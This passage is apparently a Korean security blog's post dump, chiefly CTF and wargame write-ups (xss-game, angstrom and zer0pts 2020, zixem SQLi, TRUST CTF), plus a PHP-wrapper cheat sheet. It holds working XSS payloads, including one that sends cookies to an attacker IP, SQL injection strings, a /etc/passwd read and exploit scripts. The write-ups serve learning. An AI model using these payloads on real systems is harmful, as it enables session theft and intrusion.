다 들통나게 됩니다.. (거짓된 내용 쓸려는 생각 자체가 잘못된거죠 사실,,) 서류 지원 기간은 약 한달 정도 있었는데 여차저차 하면서 사실 촉박하게 준비한 것은 맞습니다 그럼에도 불구하고 운 좋게 서류 합격 통보를 받았고 면접까지 갈 수 있는 기회가 생기게 되면서 저는 조금 기뻤지만, 감격도 잠시.. 저는 앞에 말했듯이 너무 촉박하게 준비한 탓에 프로젝트를 뭘 해야할까도 생각해야 했고 여러 무거운 관문앞에 서 있었습니다.. (사실 여기서 내가 지금 준비된게 맞을까? ) 이런 생각도 들었지만 그래도 기회가 주어진 만큼 최선을 다하자고 다짐하면서 제가 하고 싶은 프로젝트를 주제로 준비하였습니다 일단 면접을 볼때 면접대기실 분위기 자체는 괜찮았습니다. (사람 마다 느끼는건 다르지만) 멘토님 3명, 지원자 3명 이렇게 면접장에 들어가 3:3 면접을 보았는데 와.. 면접장에 들어가는 순간부터 정말 무거운 분위기가 저를 반겨주더군요,, 엄청나게 긴장하였습니다.. 그 탓인지 아는 것도 재대로 답을 하지 못했고 말을 얼버무렸습니다.. 감점요소가 제일 큰 부분이 아닐까 싶습니다. 일단 들어가면 PT 발표를 진행하게 되는데 발표 시간은 3분 이였습니다. 즉 임팩트 있게 중요한 내용만 넣어서 발표를 해야한다는 뜻이고 시간을 넘어도 끊지는 않으십니다 시간이 넘었다고 해서 당황할 필요는 없을 것 같습니다. 사실 여기까지만 보면 제가 준비 기간이 넉넉했음에도 재대로 준비를 안했던 것이 비중이 큽니다 그래도 부족한 저를 면접까지 볼 수 있는 기회를 주셨고,, 끝까지 면접 봐주신 멘토님들에게 감사 인사를 드리고 싶습니다. 결과로는 불합격을 하였지만 이번에 9기에도 지원할 수 있는 기회가 생겼으니 이번에는 꼼꼼하게 미리 잘 준비하여 기회를 잡고 싶은 심정이네요,,","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"BoB","slug":"BoB","permalink":"https://blog.jhyeon.dev/tags/BoB/"}]},{"title":"(ko) Docker Language Setting","slug":"dockerset-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T10:11:36.649Z","comments":true,"path":"2020/04/22/dockerset-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/dockerset-200422/","excerpt":"","text":"1. 설정 변경 사항sudo apt-get install locales export LANGUAGE=ko_KR.UTF-8 export LANG=ko_KR.UTF-8 source ~/.bashrc locale-gen ko_KR ko_KR.UTF-8 update-locale LANG=ko_KR.UTF-8 dpkg-reconfigure locales 근데 한글화가 필요하면, 도커 빌드 때 미리 해두는게 솔직히 편하다.. 그래서 아래에 도커 빌드 설정도 첨부해보려 한다. Dockerfile RUN apt-get install language-pack-ko -y RUN apt-get install fonts-nanum -y RUN apt-get install fonts-nanum-coding -y RUN locale-gen ko_KR.UTF-8 ENV LANG ko_KR.UTF-8 ENV LANGUAGE ko_KR.UTF-8 ENV LC_ALL ko_KR.UTF-8","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"}]},{"title":"JWT None Type Injection","slug":"jwtinjection-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:59:51.832Z","comments":true,"path":"2020/04/22/jwtinjection-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/jwtinjection-200422/","excerpt":"","text":"1. JWT(JSON WEB TOKEN)JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다. JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다. 2. JWT TOKENJWT는 아래와 같은 형태를 가지고 있고, Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8 헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다. &#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; &#125; 두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다. &#123; &quot;name&quot;: &quot;jhyeon&quot; &#125; 세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데, 이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다. HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다. 3. How to JWT None Type Attack?JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다. &#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; &#125; 일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데, 이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, \b잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다. 따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다. 참고 : https://jwt.io","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://blog.jhyeon.dev/tags/JWT/"}]},{"title":"php wrapper","slug":"phpwrapper-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:59:57.921Z","comments":true,"path":"2020/04/22/phpwrapper-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/phpwrapper-200422/","excerpt":"","text":"expect:// expect://ls php:filter php://filter/convert.base64-encode/resource=index.php zip:// zip://filename.zip#webshell.php data:// data://text/plain;base64,&#123;RCE CODE HERE&#125; php://input echo base64_encode(file_get_contents(&quot;filename&quot;));","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"}]},{"title":"Mprotect Exploitation","slug":"pwn-mprotect-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T09:00:13.268Z","comments":true,"path":"2020/04/22/pwn-mprotect-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/pwn-mprotect-200422/","excerpt":"","text":"1. 참고 링크(Notion) Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://blog.jhyeon.dev/tags/Pwn/"},{"name":"Mprotect","slug":"Mprotect","permalink":"https://blog.jhyeon.dev/tags/Mprotect/"},{"name":"Shellcode","slug":"Shellcode","permalink":"https://blog.jhyeon.dev/tags/Shellcode/"},{"name":"Exploitation","slug":"Exploitation","permalink":"https://blog.jhyeon.dev/tags/Exploitation/"}]},{"title":"xss game Write up","slug":"xssgame-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T09:01:08.490Z","comments":true,"path":"2020/04/22/xssgame-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/xssgame-200422/","excerpt":"","text":"홈페이지 : https://xss-game.appspot.com/ 1. LEVEL-1&lt;svg onload=alert(1)&gt; 2. LEVEL-2&lt;img src=&quot;#&quot; onerror=alert(1)&gt; onerror 이벤트 핸들러로 alert를 띄워줄 수 있다. 3. LEVEL-3 &lt;script&gt; function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;&quot;; $(&#39;#tabContent&#39;).html(html); window.location.hash = num; // Select the current tab var tabs = document.querySelectorAll(&#39;.tab&#39;); for (var i = 0; i &lt; tabs.length; i++) &#123; if (tabs[i].id == &quot;tab&quot; + parseInt(num)) &#123; tabs[i].className = &quot;tab active&quot;; &#125; else &#123; tabs[i].className = &quot;tab&quot;; &#125; &#125; // Tell parent we&#39;ve changed the tab top.postMessage(self.location.toString(), &quot;*&quot;); &#125; window.onload = function() &#123; chooseTab(unescape(self.location.hash.substr(1)) || &quot;1&quot;); &#125; // Extra code so that we can communicate with the parent page window.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; chooseTab(unescape(self.location.hash.substr(1))); &#125; &#125;, false); &lt;/script&gt; &lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt; chooseTab 함수가 호출될 때, 위와 같이 img 태그를 사용하고 있다. 여기서 onerror event handler 사용할려면 #framenum.jpg’ onerror=~ 와 같이 페이로드를 완성해주면 된다. frame#4.jpg&#39; onerror=alert(1)&gt; 4. LEVEL-4 &lt;script&gt; function startTimer(seconds) &#123; seconds = parseInt(seconds) || 3; setTimeout(function() &#123; window.confirm(&quot;Time is up!&quot;); window.history.back(); &#125;, seconds * 1000); &#125; &lt;/script&gt; &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; timer &#125;&#125;&#39;);&quot; /&gt; 타이머 호출 스크립트이다, 그냥 입력한 숫자만큼 타이머가 돌아가는 구조라서 딱히 건드릴 부분은 없다. 하지만, 위 부분을 보면 onload event handler 로 스크립트를 실행하고 있다. 즉, onload 부분을 이용해서 alert를 띄워주면 된다. timer=1&#39;);alert(&#39;1 5. LEVEL-5&lt;body id=&quot;level5&quot;&gt; Welcome! Today we are announcing the much anticipated&lt;br&gt;&lt;br&gt; &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt; &lt;a href=&quot;/level5/frame/signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; for an exclusive Beta. &lt;/body&gt; welcome.html 에서 sign up 페이지로 넘어가는 과정을 보면 ?next= 파라미터에 confirm 값을 담아서 a 태그로 페이지를 넘긴다. 여기서 보면 get 방식으로 값이 넘어오기 때문에 next= 에 대한 값을 바꿀 수 있게 된다. 즉, href 속성 값의 next= 파라미터의 값을 통해 alert 팝업을 실행해야 하는데, a 태그에서의 javascript 실행은 다음과 같이 구성된다. javascript:alert(1) 그래서 next=javascript:alert(1) 를 입력해주면 next 버튼을 클릭했을 때 자바스크립트 팝업창이 실행된다. 6. LEVEL-6&lt;script&gt; function setInnerText(element, value) &#123; if (element.innerText) &#123; element.innerText = value; &#125; else &#123; element.textContent = value; &#125; &#125; function includeGadget(url) &#123; var scriptEl = document.createElement(&#39;script&#39;); // This will totally prevent us from loading evil URLs! if (url.match(/^https?:\\/\\//)) &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Sorry, cannot load a URL containing \\&quot;http\\&quot;.&quot;); return; &#125; // Load this awesome gadget scriptEl.src = url; // Show log messages scriptEl.onload = function() &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Loaded gadget from &quot; + url); &#125; scriptEl.onerror = function() &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Couldn&#39;t load gadget from &quot; + url); &#125; document.head.appendChild(scriptEl); &#125; // Take the value after # and use it as the gadget filename. function getGadgetName() &#123; return window.location.hash.substr(1) || &quot;/static/gadget.js&quot;; &#125; includeGadget(getGadgetName()); // Extra code so that we can communicate with the parent page window.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; includeGadget(getGadgetName()); &#125; &#125;, false); &lt;/script&gt; 마지막 문제이다, 전체적인 코드가 좀 긴데 보면은 url.match 로 https 값이 있는지 검증해서 필터링한다. 그렇다고 http를 넣어서 하면은 http를 포함할 수 없다고 오류 메세지를 친절하게 반환해준다. &lt;script src=&quot;값&quot;&gt;&lt;/script&gt; 위 조건을 통과하고 나면 script를 호출하게 되는데 위와 같이 실행된다. 문제의 의도대로 풀려면 힌트에서 주어지는 google api 를 통해서 보면 되는데, https ://google.com/jsapi?callback=foo 여기서 함수 호출 과정을 보니 callback 파리미터로 넘어온 변수를 실행시켜주고 있다. 그렇기에 callback 파라미터로 alert를 날려주면 alert(); 이 실행될 것 이다. #Https://google.com/jsapi?callback=alert ALL CLEAR","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"angstorm ctf 2020 Write up","slug":"angstormctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T08:59:20.413Z","comments":true,"path":"2020/04/10/angstormctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/angstormctf-200410/","excerpt":"","text":"1. [WEB - The Magic Word]&lt;script&gt; var msg = document.getElementById(&quot;magic&quot;); setInterval(function() &#123; if (magic.innerText == &quot;please give flag&quot;) &#123; fetch(&quot;/flag?msg=&quot; + encodeURIComponent(msg.innerText)) .then(res =&gt; res.text()) .then(txt =&gt; magic.innerText = txt.split``.map(v =&gt; String.fromCharCode(v.charCodeAt(0) ^ 0xf)).join``); &#125; &#125;, 1000); &lt;/script&gt; magic 텍스트의 값을 please give flag 으로 바꿔주면 된다. 2. [WEB - Xmas Still Stands]문제 내 post 기능에서 xss 취약점이 발생한다. 글을 써놓고 report 기능을 통해 게시글 번호를 전송해주면 봇이 내 글에 방문하기 때문에 리다이렉션으로 돌려놓고 포트 열고 대기하면 쿠키값이 날아오는데 날아오는 쿠키값으로 페이지 내 쿠키를 다시 세팅해주고 /admin 으로 접속하면 된다. &lt;img src=&quot;#&quot; onerror=this.src=&#39;https://IP:9999/?cookie=&#39;+document.cookie/&gt; GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1-&gt; super_secret_admin_cookie=hello_yes_i_am_admin 3. [WEB - Consolation]&lt;button onclick=&quot;nofret()&quot; style=&quot;height:150px; width:150px;&quot;&gt;pay me some money&lt;/button&gt; 먼저 이 버튼을 누르면 nofret() 라는 함수를 호출 시키는데 이 함수를 따라가면 다음과 같다. function nofret()&#123;document[_0x4229(&#39;0x95&#39;,&#39;kY1#&#39;)](_0x4229(&#39;0x9&#39;,&#39;kY1#&#39;))[_0x4229(&#39;0x32&#39;,&#39;yblQ&#39;)]=parseInt(document[_0x4229(&#39;0x5e&#39;,&#39;xtR2&#39;)](_0x4229(&#39;0x2d&#39;,&#39;uCq1&#39;))[&#39;innerHTML&#39;])+0x19;console[_0x4229(&#39;0x14&#39;,&#39;70CK&#39;)](_0x4229(&#39;0x38&#39;,&#39;rwU*&#39;));console[&#39;clear&#39;]();&#125; [_0x4229(‘0x95’,’kY1#’)] 이 값을 chrome console 에서 실행시키면 어떤 값인지 알 수 있다. (getelementbyid) 순서대로 콘솔에 실행시켜보면 결과적으로, 0x4229(‘0x38’,’rwU*’) 이 값이 FLAG 를 가지고 있고, 콘솔에서 실행시키면 플래그를 얻을 수 있다. 4. [WEB - Git Good]아무것도 없는 Hello world 출력만 된 페이지이다, 문제의 이름 답게 /.git/ 을 통해 repository 저장소를 다운로드 할 수 있다. git clone https://gitgood.2020.chall.actf.co/.git/ 해당 저장소를 다운받아서 보면, thisistheflag.txt 라는 파일이 있는데 아무것도 없다, 그래서 커밋된 정보를 확인하기 위해 git show 를 해보면, 플래그가 있다. --- a/thisistheflag.txt +++ b/thisistheflag.txt @@ -1,3 +1 @@ -actf&#123;b3_car3ful_wh4t_y0u_s3rve_wi7h&#125; 5. [WEB - Secret Agents]처음엔 고민좀 해보다가 user-agent injection 을 통해서 문제를 풀 수 있었다. user-agent 값에 ‘ or ‘1’ = ‘1# 과 같이 injection 을 하나씩 해주고 사이트에 들어가보면 오류 메세지가 각각 다르게 반환되는 것을 볼 수 있다. 결과적으로 ‘ or ‘1’ = ‘1’ limit 2,1# 를 user-agent 값에 주입 하면 플래그가 있는 페이지를 볼 수 있다.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"zer0pts 2020 Write up","slug":"zer0ptsctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T09:01:16.940Z","comments":true,"path":"2020/04/10/zer0ptsctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zer0ptsctf-200410/","excerpt":"","text":"1. [web] can you guess it?(338 pt)&lt;?php include &#39;config.php&#39;; // FLAG is defined in config.php if (preg_match(&#39;/config\\.php\\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); &#125; $secret = bin2hex(random_bytes(64)); if (isset($_POST[&#39;guess&#39;])) &#123; $guess = (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message = &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message = &#39;Wrong.&#39;; &#125; &#125; ?&gt; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); &#125; 해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다. &lt;?php if (preg_match(&#39;/config\\.php\\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데, 정규식 표현으로 입력값 필터링을 하고 있다. 그런데 php 에서 basename 함수는 문자 \\x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다. index.php/config.php/%80?source 2. [web] music blog(653 pt)&lt;?php // (snipped) const flag = &#39;zer0pts&#123;&lt;censored&gt;&#125;&#39;; // (snipped) const crawl = async (url) =&gt; &#123; console.log(`[+] Query! ($&#123;url&#125;)`); const page = await browser.newPage(); try &#123; await page.setUserAgent(flag); await page.goto(url, &#123; waitUntil: &#39;networkidle0&#39;, timeout: 10 * 1000, &#125;); await page.click(&#39;#like&#39;); &#125; catch (err)&#123; console.log(err); &#125; await page.close(); console.log(`[+] Done! ($&#123;url&#125;)`) &#125;; 문제에 보면 게시글을 올릴 수 있는 기능이 있다. 그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다. 그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다. &lt;section&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1 class=&quot;mt-4&quot;&gt; &lt;?php if ($post[&#39;published&#39;] === &#39;0&#39;) &#123; ?&gt;&lt;span class=&quot;badge badge-secondary&quot;&gt;Secret&lt;/span&gt;&lt;?php &#125; ?&gt; &lt;?= $post[&#39;title&#39;] ?&gt; &lt;/h1&gt; &lt;span class=&quot;text-muted&quot;&gt;by &lt;?= $post[&#39;username&#39;] ?&gt; &lt;span class=&quot;badge badge-love badge-pill&quot;&gt;♥ &lt;?= $post[&#39;likes&#39;] ?&gt;&lt;/span&gt;&lt;/span&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;?= render_tags($post[&#39;content&#39;]) ?&gt; &lt;/div&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;a href=&quot;like.php?id=&lt;?= $post[&#39;id&#39;] ?&gt;&quot; id=&quot;like&quot; class=&quot;btn btn-love&quot;&gt;♥ Like this post&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/section&gt; 게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다. 로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때 리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다. function render_tags($str) &#123; $str = preg_replace(&#39;/\\[\\[(.+?)\\]\\]/&#39;, &#39;&lt;audio controls src=&quot;\\\\1&quot;&gt;&lt;/audio&gt;&#39;, $str); $str = strip_tags($str, &#39;&lt;audio&gt;&#39;); // only allows `&lt;audio&gt;` return $str; &#125; 하지만 입력값 필터링이 걸려 있다. 그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면 audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다. 즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다. &lt;a/udio href=&#39;myip.kr:12345&#39; id=&#39;like&#39;&gt;like","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"zixem challenge Write up","slug":"zixemchall-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T09:01:22.638Z","comments":true,"path":"2020/04/10/zixemchall-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zixemchall-200410/","excerpt":"","text":"Site : https://www.zixem.altervista.org/SQLi/ 1. LEVEL-1id=0%20union%20select%201,version(),3;--%20- 2. LEVEL-2showprofile=0%27%20union%20select%201,2,version(),4;--%20- 3. LEVEL-3item=0%27%20unionon%20select%201,2,version(),4;--%20- 4. LEVEL-4ebookid=0%27%20union%20select%201,2,3,version(),5;--%20- 5. LEVEL-5#!/usr/bin/python import requests for i in range(0,2000): param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i) r = requests.get(param) print param if &quot;Brute Force&quot; in r.text: print &quot;found key: &quot; + str(i) break 6. LEVEL-6serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23 7. LEVEL-7id=0%20union%20select%201,version(),3;--%20- 8. LEVEL-8id=0%09union%09seselectlect%091,version(),3;--%09- 9. LEVEL-90%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20- 10. LEVEL-10 php uuencode -&gt; base64 encode x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK ALL CLEAR","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"TRUST CTF 2019 Write up","slug":"trustctf-200223","date":"2020-02-22T15:00:00.000Z","updated":"2021-01-17T09:00:28.050Z","comments":true,"path":"2020/02/23/trustctf-200223/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/23/trustctf-200223/","excerpt":"","text":"1. (web) ezrc&lt;?php session_start(); include &#39;config.php&#39;; ?&gt; &lt;?php if(!isset($_SESSION[&#39;id&#39;]))&#123; header(&#39;Location: ./login.html&#39;); exit; &#125; ?&gt; &lt;a href=&quot;source.php&quot;&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt; &lt;?php $id = $_SESSION[&#39;id&#39;]; $res = mysqli_query($con, &quot;select pw from ezrc where id=&#39;$id&#39;&quot;); $idx = mysqli_fetch_array($res); $pw = $idx[&#39;pw&#39;]; $print_query = &quot;select chk from ezrc where id=&#39;$id&#39;&quot;; $hehe_query = &quot;update ezrc set chk=&#39;$hehe&#39; where id=&#39;$id&#39;&quot;; $reset_query = &quot;update ezrc set chk=&#39;nope&#39; where id=&#39;$id&#39;&quot;; echo &quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;; echo &quot;your id is &quot;.$id.&quot;&lt;br/&gt;&quot;; if(preg_match(&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;, $_GET[&#39;key&#39;]) &amp;&amp; strlen($_GET[&#39;key&#39;])&gt;30)&#123; $res = mysqli_query($con, $print_query); $idx = mysqli_fetch_array($res); echo &quot;your chk is &quot;.$idx[&#39;chk&#39;].&quot;&lt;br/&gt;&quot;; if($idx[&#39;chk&#39;] == $hehe)&#123; echo $flag.&quot;&lt;br/&gt;&quot;; mysqli_query($con, $reset_query); exit(&quot;congratulations&quot;); &#125; &#125; mysqli_query($con, $hehe_query); $str = &quot;trust_is_very_cooool&quot;; $t = (int)$_GET[&#39;times&#39;]; if($pw == md5(240610708))&#123; echo &quot;pw right&quot;; for($i=0; $i&lt;$t; $i=$i+1)&#123; for($j=0; $j&lt;$t; $j=$j+1)&#123; $str = md5($str); &#125; &#125; if($str == &quot;d91a2796ab967c9793ef1c628a91fac5&quot;)&#123; echo $flag; &#125; else&#123; mysqli_query($con, $reset_query); &#125; &#125; else&#123; mysqli_query($con, $reset_query); &#125; ?&gt; 레이스 컨디션(race condition) 을 이용하는 문제이다. 서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다. CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 신기하다. (잘 못보던 케이스) 암튼 파이썬으로 코딩해서 문제를 풀어주면 된다. import requests import threading cookie1 = &#123;&#39;PHPSESSID&#39;:&#39;bb11&#39;&#125; cookie2 = &#123;&#39;PHPSESSID&#39;:&#39;bb22&#39;&#125; def login(cookie): url = &quot;http://198.13.32.181:4345/login_check.php&quot; param = &#123;&#39;id&#39;:&#39;bb&#39;,&#39;pw&#39;:&#39;bb&#39;&#125; r = requests.post(url, data=param, cookies=cookie) print r.text def times(): global cookie1; url = &quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot; r = requests.get(url, cookies=cookie1) def flag(): global cookie2; url = &quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot; r = requests.get(url, cookies=cookie2) print r.text def main(): login(cookie1) login(cookie2) t1 = threading.Thread(target=times,args=()) t2 = threading.Thread(target=flag,args=()) t1.start() t2.start() main() Thank you (NGA) 2. (web) jpg viewer&lt;?php session_start(); require_once __DIR__ . &#39;/jwt.php&#39;; if(!isset($_COOKIE[&#39;PHPSESSJWT&#39;]))&#123; $token = $jwt-&gt;hashing(array( &#39;admin&#39; =&gt; false, &#39;iat&#39; =&gt; time(), )); setcookie(&#39;PHPSESSJWT&#39;, $token, time() + 86400 * 30); &#125; ?&gt; &lt;?php require_once __DIR__ . &#39;/jwt.php&#39;; $token = $_COOKIE[&#39;PHPSESSJWT&#39;]; if ($token) &#123; $body = $jwt-&gt;dehashing($token); &#125; if(isset($_GET[&#39;source&#39;]))&#123; echo highlight_file(__FILE__); exit; &#125; function imageanalyze($file)&#123; if(!is_file($file))&#123; echo &#39;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#39;; exit; &#125; elseif(!exif_read_data($file))&#123; unlink($file); exit; &#125; else&#123; return exif_read_data($file); &#125; &#125; if(isset($_FILES[&#39;JPG&#39;]) &amp;&amp; $_FILES[&#39;JPG&#39;][&#39;name&#39;] != &quot;&quot;) &#123; $file = $_FILES[&#39;JPG&#39;]; $upload_directory = &#39;./uploads/&#39;; $ext_str = array(&quot;jpg&quot;); $max_file_size = 5242880; $ext = explode(&#39;.&#39;,$file[&#39;name&#39;]); $ext = strtolower(array_pop($ext)); if(!in_array($ext, $ext_str)) &#123; echo &quot;&lt;script&gt;alert(&#39;jpg파일만 업로드 할 수 있습니다.&#39;)&lt;/script&gt;&quot;; exit; &#125; if($file[&#39;size&#39;] &gt;= $max_file_size) &#123; echo &quot;&lt;script&gt;alert(&#39;파일은 5MB 까지만 업로드 가능합니다.&#39;)&lt;/script&gt;&quot;; exit; &#125; $path = $upload_directory.session_id(); $updir = $path.&#39;/&#39;.$file[&#39;name&#39;]; mkdir($path,0777); if(move_uploaded_file($file[&#39;tmp_name&#39;],$updir)) &#123; echo &quot;&lt;script&gt;alert(&#39;파일 업로드 성공!&#39;)&lt;/script&gt;&quot;; echo &quot;&lt;img src=&#39;$updir&#39;&gt;&quot;; $infor = imageanalyze($updir); &#125; else&#123; echo &quot;&lt;script&gt;alert(&#39;업로드 에러!&#39;)&lt;/script&gt;&quot;; exit; &#125; &#125; ?&gt; &lt;?php if(isset($infor))&#123; $Date = $infor[&#39;DateTimeOriginal&#39;]; $Model = $infor[&#39;Model&#39;]; $Make = $infor[&#39;Make&#39;]; $size = round($infor[&#39;FileSize&#39;]/1024,1); echo &quot;&lt;br&gt;파일명 : &#123;$infor[&#39;FileName&#39;]&#125;&lt;br&gt;&quot;; echo &quot;파일 크기 : &#123;$size&#125;KB&lt;br&gt;&quot;; if(array_key_exists(&#39;DateTimeOriginal&#39;,$infor))&#123; echo &quot;촬영 시간 : &#123;$Date&#125;&lt;br&gt;&quot;; &#125; else&#123; $date = date(&quot;Y-m-d H:i:s&quot;, $infor[&#39;FileDateTime&#39;]); echo &quot;업로드 시간 : &#123;$date&#125;&lt;br&gt;&quot;; &#125; if(array_key_exists(&#39;Model&#39;,$infor)&amp;&amp;isset($infor[&#39;Model&#39;]))&#123; echo &quot;카메라 모델 : 